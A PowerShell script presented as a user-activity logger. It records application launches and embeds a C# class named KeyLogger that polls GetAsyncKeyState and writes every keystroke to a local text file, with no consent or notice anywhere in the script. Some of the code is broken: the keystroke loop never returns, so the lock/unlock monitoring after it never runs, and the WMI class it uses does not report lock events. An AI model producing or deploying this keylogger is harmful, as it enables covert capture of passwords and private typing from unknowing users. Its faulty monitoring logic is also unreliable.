# Specify the log file path
$logFilePath = "C:\UserActivityLog.txt"

# Function to log user activity
function LogActivity($activity) {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logEntry = "$timestamp - $activity"
    $logEntry | Out-File -Append -FilePath $logFilePath
}

# Start logging user activity
LogActivity "User activity logging started"

# Monitor application openings
$wmiEventAppStart = Register-WmiEvent -Class Win32_ProcessStartTrace -SourceIdentifier AppStartEvent -Action {
    $appName = $event.SourceEventArgs.NewEvent.ProcessName
    LogActivity "Opened application: $appName"
}

# Monitor keystrokes
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyLogger {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);

    public static void StartLogging() {
        string keys = "";
        while (true) {
            System.Threading.Thread.Sleep(10);
            for (int i = 32; i < 127; i++) {
                int keyState = GetAsyncKeyState(i);
                if (keyState == -32767) {
                    keys += (Keys)i + " ";
                }
            }
            if (keys.Length > 0) {
                System.IO.File.AppendAllText("$logFilePath", "Keys: " + keys + Environment.NewLine);
                keys = "";
            }
        }
    }
}
"@
[KeyLogger]::StartLogging()

# Monitor PC lock/unlock
$wmiEventLockUnlock = Register-WmiEvent -Class Win32_ComputerShutdownEvent -SourceIdentifier LockUnlockEvent -Action {
    if ($event.SourceEventArgs.NewEvent.EventType -eq 2) {
        LogActivity "User left the PC"
    } elseif ($event.SourceEventArgs.NewEvent.EventType -eq 1) {
        LogActivity "User returned to the PC"
    }
}

# Keep the script running
try {
    while ($true) {
        Start-Sleep -Seconds 60
    }
} finally {
    # Clean up and stop monitoring
    Unregister-Event -SourceIdentifier AppStartEvent
    Unregister-Event -SourceIdentifier LockUnlockEvent
    LogActivity "User activity logging stopped"
}
